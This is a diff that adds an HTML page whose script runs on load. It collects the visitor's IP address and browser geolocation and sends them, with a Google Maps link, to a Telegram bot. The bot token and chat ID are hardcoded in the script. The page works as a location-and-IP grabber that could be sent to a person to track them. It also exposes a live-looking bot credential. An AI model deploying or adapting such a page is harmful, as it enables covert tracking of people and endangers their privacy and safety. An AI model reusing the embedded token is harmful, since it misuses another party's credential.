@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Location to Telegram</title>
+</head>
+<body>
+    <h1>Send Location and IP to Telegram</h1>
+    <p id="status">Fetching your location...</p>
+    <script>
+        const botToken = "7746117883:AAGZRV65ZmLtIgn8tAYQ9A8GLGRUMMqr5AY"; // Replace with your Telegram bot token
+        const chatId = "6761965786"; // Replace with your Telegram chat ID
+
+        async function sendLocationToTelegram() {
+            try {
+                // Fetch user's IP address
+                const ipResponse = await fetch('https://ipapi.co/json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+
+                // Fetch user's geolocation
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        // Prepare data
+                        const message = `🌐 Location Data Received:
+- **IP Address**: ${ipAddress}
+- **Latitude**: ${latitude}
+- **Longitude**: ${longitude}
+- [Google Maps Link](https://www.google.com/maps?q=${latitude},${longitude})`;
+
+                        // Send to Telegram
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message,
+                                parse_mode: 'Markdown'
+                            })
+                        });
+
+                        document.getElementById('status').innerText = "Location sent to Telegram successfully!";
+                    }, (error) => {
+                        console.error(error);
+                        document.getElementById('status').innerText = "Failed to get location.";
+                    });
+                } else {
+                    document.getElementById('status').innerText = "Geolocation is not supported by this browser.";
+                }
+            } catch (err) {
+                console.error(err);
+                document.getElementById('status').innerText = "An error occurred.";
+            }
+        }
+
+        // Trigger location fetch and send on load
+        sendLocationToTelegram();
+    </script>
+</body>
+</html>
